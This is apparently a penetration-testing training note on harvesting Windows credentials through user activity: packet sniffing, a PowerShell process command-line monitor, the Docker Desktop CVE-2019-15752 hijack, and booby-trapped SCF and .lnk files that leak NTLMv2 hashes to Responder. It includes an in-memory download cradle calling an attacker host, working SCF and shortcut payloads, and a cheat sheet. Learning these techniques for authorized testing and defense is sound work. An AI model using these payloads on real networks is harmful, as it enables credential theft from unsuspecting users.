# Interacting with Users

---

> Also check `36.5 - Extracting passwords from Network`
---

## Table of Contents
1. [Big Idea: The Human Attack Surface](#1-big-idea-the-human-attack-surface)
2. [Traffic Capture](#2-traffic-capture)
3. [Monitoring Process Command Lines](#3-monitoring-process-command-lines)
4. [Vulnerable Services Requiring User Interaction](#4-vulnerable-services-requiring-user-interaction)
5. [SCF Files on a File Share](#5-scf-files-on-a-file-share)
6. [Malicious .lnk Files](#6-malicious-lnk-files)
7. [Choosing a Technique — Decision Flow](#7-choosing-a-technique--decision-flow)
8. [Cheat Sheet](#8-cheat-sheet)
9. [Big-Picture Takeaways](#9-big-picture-takeaways)

---

## 1. Big Idea: The Human Attack Surface

Up to this point, the focus has been on finding credentials that are already sitting around — in files, registries, or saved app data. But sometimes the fastest path to a credential is simply **waiting for a real person to generate one**, or nudging them into doing so without realizing it.

A busy employee clicking through a shared drive, running a familiar-looking file, or just going about their normal workday may never notice that something is slightly "off" — an extra icon in a folder, a file that isn't quite what it claims to be. This document covers techniques that take advantage of that: capturing network traffic, watching for credentials that flash across the command line, exploiting software that needs a user to interact with it, and planting booby-trapped files on shares that unsuspecting users will eventually open or browse into.

Think of it like leaving a fake "free Wi-Fi" sign next to the real one — most people won't notice the difference, and by the time they do, they've already handed over something valuable.

---

## 2. Traffic Capture

### Wireshark
**Wireshark** is a popular graphical tool for capturing and inspecting network traffic. Capturing traffic normally requires elevated privileges, but by default, the **Npcap** driver (which Wireshark relies on to capture packets) is *not* configured to restrict access to administrators only. This means that if Wireshark happens to already be installed on a system you've landed on, even an unprivileged (non-admin) user may be able to start a capture — which is always worth attempting, since you never know what interesting traffic might pass by.

### Positioned on the Network Itself
If, as part of an authorized engagement, your attack machine is placed directly inside the target's network (rather than just on one compromised workstation), it's worthwhile to simply let a capture tool like **tcpdump** (a command-line packet capture tool) or Wireshark run for a while and observe what kind of traffic crosses the wire.

### net-creds
[net-creds](https://github.com/DanMcInerney/net-creds) is a tool that specifically watches network traffic — either live from an interface or from an already-saved `.pcap` capture file — looking for passwords and password hashes. Running it passively in the background during an engagement (or against a saved capture afterward) can surface credentials useful for both privilege escalation and lateral movement, without you needing to do anything active.

---

## 3. Monitoring Process Command Lines

### Why This Works
Many administrative tasks — scheduled jobs, login scripts, automated backups — pass credentials directly as arguments on the command line (e.g., `/user:someone /password:hunter2`). The problem (for the account's owner) is that **every running process's full command line is visible to anyone who can query it**, at least for a brief window while that process runs. If you can watch for new processes starting, you may catch a credential flash by.

### A Simple Polling Script
This PowerShell script repeatedly takes a snapshot of every running process's command line, waits briefly, takes another snapshot, and then prints out the differences — in other words, it shows you whatever processes started or changed in that window.

```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
- `Get-WmiObject Win32_Process` — queries Windows Management Instrumentation (WMI, a built-in Windows system for querying system information) for every currently running process, including its command line.
- `Compare-Object` — compares two snapshots and reports what's different between them (new or disappeared entries).
- The loop repeats this forever, essentially creating a live "process command-line monitor."

### Running It Against a Target
Rather than copying the script file over manually, it can be hosted on your own attack machine and fetched and executed directly in memory on the target:

```
PS C:\evilcorp> IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine="C:\Windows\system32\cmd.exe" }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:evilcorp\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine="C:\Windows\system32\backgroundTaskHost.exe" -ServerName:CortanaUI.AppXy7vb4pc2... <=
```
- `iwr` is PowerShell shorthand for `Invoke-WebRequest`, which downloads the script's content from the attacker's web server.
- `IEX` (`Invoke-Expression`) runs that downloaded text as if it were a script typed locally — this combination is often called a "download cradle," a way to run a remote script without ever saving it to disk first.
- Buried in the output is a `net use` command (used to map a network drive) that includes `/user:evilcorp\sqlsvc My4dm1nP@s5w0Rd` — a plaintext username and password for the `sqlsvc` domain service account, caught in the act of connecting to a backup share on `sql02`.

This credential could potentially be reused to access the `SQL02` server directly, or to dig through the backups share for further sensitive data like database connection strings.

---

## 4. Vulnerable Services Requiring User Interaction

Sometimes privilege escalation depends not on a file or a credential, but on a genuine software **vulnerability** (a flaw in how a program is built or configured) that only triggers when a user does something ordinary, like starting an app or logging in.

### Case Study: CVE-2019-15752 (Docker Desktop)
A **CVE** (Common Vulnerabilities and Exposures) number is a standardized ID assigned to a publicly known security flaw, so researchers and vendors can reference the exact same issue consistently.

[CVE-2019-15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) affected **Docker Desktop Community Edition** versions before 2.1.0.1. Here's the chain of events:
1. When this version of Docker starts, it looks for several helper executables — such as `docker-credential-wincred.exe` — in the folder `C:\PROGRAMDATA\DockerDesktop\version-bin\`.
2. These particular files don't actually exist in a normal Docker installation — Docker just checks for them, in case they're needed.
3. The folder itself was misconfigured with **full write access granted to the `BUILTIN\Users` group** — meaning *any* authenticated (logged-in) user on the machine, regardless of privilege level, could create or drop files into that folder.
4. Because of this, a low-privileged user could place a malicious executable in that folder, named to match one of the files Docker looks for.
5. That malicious executable would then run automatically whenever a) Docker starts up, or b) a user runs the command `docker login`.

This is a good illustration of why **thorough enumeration of installed software** matters — a flaw like this isn't obvious unless you specifically know to check for it, and it may still exist on older developer workstations that haven't been patched. It's also not an instant win: since it depends on a service restart or a user running `docker login`, you might have to plant your malicious file and simply wait, checking back periodically during a longer engagement to see if it has paid off.

---

## 5. SCF Files on a File Share

### What an SCF File Is
A **Shell Command File** (`.scf`) is a small configuration file that Windows Explorer (the file browser you see when opening "This PC" or a folder) normally uses for simple navigation tasks — like showing the Desktop. The trick: an SCF file's `IconFile` setting (which icon to display for that file) can be pointed at a network path (a **UNC path**, Windows' standard way of referencing something like `\\servername\sharename\file`) instead of a local file.

When Windows Explorer renders the folder containing that SCF file, it automatically tries to fetch the icon from the specified network path — which means it opens an **SMB** connection (SMB is the Windows file-sharing protocol) to wherever you point it, **without the user clicking anything at all**. Just browsing into the folder is enough to trigger it.

If you control the server at that network path and run a credential-capturing tool like [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), you can capture the **NTLMv2 password hash** (a cryptographic representation of the user's password, created during Windows' authentication handshake — not the plaintext password itself, but often crackable) of anyone who simply browses that folder.

This technique is especially effective if you have write access to a busy, heavily-used file share, or even just a folder on a single user's workstation.

### Building the Malicious SCF File

In this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.
```ini
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- `IconFile=\\10.10.14.3\share\legit.ico` — this is the key line: it points Explorer's icon-fetching logic at an attacker-controlled IP address (here, a lab/training IP — `tun0` refers to the VPN network interface commonly used in these training labs) and a fake share/icon name.
- Naming the file something like `@Inventory.scf` serves two purposes: starting the filename with `@` tends to sort it near the top of the folder listing (so it's rendered — and thus triggers — as soon as possible), and naming it similarly to other real files in that folder (`Inventory`) helps it blend in and avoid suspicion.

### Capturing the Hash with Responder
**Responder** is a tool that listens for and responds to certain types of network name-resolution requests (like LLMNR and NBT-NS, two legacy Windows protocols for resolving hostnames on a local network) and SMB authentication attempts, capturing any credentials offered along the way.

```
$ sudo responder -w -v -I tun0

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server                [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.3]
    ...

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```
- `-w` enables Responder's WPAD rogue proxy server; `-v` turns on verbose output; `-I tun0` tells it which network interface to listen on.
- Responder turns on a long list of fake network services (SMB, FTP, HTTP, etc.) all at once, each capable of capturing credentials if a victim's machine tries to authenticate to them.
- The payoff appears at the bottom: Responder captured an **NTLMv2-SSP hash** belonging to the `Administrator` account on `WINLPE-SRV01` — meaning that account browsed the booby-trapped share and (invisibly, from their point of view) tried to authenticate to the attacker's fake SMB server.

### Cracking the Captured Hash
The captured hash isn't a plaintext password yet — it needs to be cracked offline using a tool like **Hashcat**, with mode `5600` (the mode number that tells Hashcat "this is an NTLMv2 hash"):
```
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

---

## 6. Malicious .lnk Files

### Why Use This Instead of SCF
The SCF trick above stopped working on **Windows Server 2019** hosts. A `.lnk` file (a Windows "shortcut" file) can achieve a very similar effect — triggering an authentication attempt just by being browsed into — but `.lnk` files are more complex to hand-craft than a simple SCF text file. Purpose-built tools like [Lnkbomb](https://github.com/dievus/lnkbomb) exist to generate malicious shortcut files, or you can build a basic one yourself with a short PowerShell script.

### Generating One with PowerShell
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
- `New-Object -ComObject WScript.Shell` — creates a COM object (a reusable Windows component) that knows how to build shortcut files.
- `CreateShortcut("C:\legit.lnk")` — starts building a new shortcut file at the given path, with a deliberately unremarkable name (`legit.lnk`).
- `$lnk.TargetPath = "\\<attackerIP>\@pwn.png"` — this is the key line: just like the SCF file's `IconFile`, pointing the shortcut's target at an attacker-controlled UNC path causes Windows to attempt an SMB connection to that path the moment Explorer needs to resolve information about the shortcut — again, no click required.
- `.IconLocation` — sets a normal-looking icon (pulled from a real system file, `shell32.dll`) so the shortcut doesn't look suspicious.
- `.Save()` — writes the finished `.lnk` file to disk.

Once dropped onto a shared folder, the same Responder/Hashcat workflow described above for SCF files applies here too.

---

## 7. Choosing a Technique — Decision Flow

```
        Do you need a credential from a REAL USER rather than from disk?
                              |
          --------------------------------------------------
          |                 |                  |            |
   You can see/sniff   You can watch a    You found an   You have write
   network traffic     user's commands    old/vulnerable access to a
   (Wireshark/          running live       app that runs  shared folder
   tcpdump/net-creds)   (procmon script)   on user action  users browse
          |                 |                  |            |
     Passive capture;   Loop snapshot +    Plant payload  Drop malicious
     watch for creds    diff running       where it's     SCF (older OS)
     in the clear        processes          looked for,    or .lnk file
                                             wait for        (newer OS),
                                             trigger          run Responder,
                                                               crack hash
```

---

## 8. Cheat Sheet

| Goal | Command / Tool |
|------|-----------------|
| Sniff credentials from live traffic or a pcap | `net-creds` |
| Watch for process command-line credentials (loop) | PowerShell `Get-WmiObject Win32_Process` + `Compare-Object` script |
| Fetch & run a script from attacker host in memory | `IEX (iwr 'http://ATTACKER_IP/script.ps1')` |
| Exploit CVE-2019-15752 (Docker Desktop) | Drop malicious exe as `docker-credential-wincred.exe` in a writable `C:\PROGRAMDATA\DockerDesktop\version-bin\` |
| Create a malicious SCF icon-pointer file | `.scf` file with `IconFile=\\ATTACKER_IP\share\legit.ico` |
| Start Responder to capture NTLMv2 hashes | `sudo responder -w -v -I tun0` |
| Crack a captured NTLMv2 hash | `hashcat -m 5600 hash wordlist.txt` |
| Create a malicious .lnk shortcut (PowerShell) | `New-Object -ComObject WScript.Shell` + `CreateShortcut` + set `.TargetPath` to a UNC path |

---

## 9. Big-Picture Takeaways

1. Not every credential needs to be "found" — some can be **harvested passively** by watching network traffic or process activity while real users go about their normal work.
2. Command-line arguments are not a safe place to pass credentials, because any process (and its full command line) can potentially be observed by other users or monitoring scripts on the same system, even briefly.
3. Outdated or misconfigured software (like the Docker Desktop example) can create an unintentional "write here and wait" privilege escalation path — this is a strong argument for thorough software enumeration during an assessment.
4. Techniques like malicious SCF and `.lnk` files turn an everyday action — simply opening a folder — into a silent authentication attempt, which tools like Responder can capture as a crackable password hash.
5. Operating system updates can close off specific tricks (SCF abuse no longer works on Server 2019), but attackers typically have a fallback technique (`.lnk` files) that achieves a similar result, so defenders need to think about the underlying behavior, not just patch one specific file type.
6. Across all of these techniques, success depends on a **real person eventually doing something ordinary** — logging in, browsing a share, running an app — which is why patience and realistic planning (waiting, checking back periodically) are often part of the process.
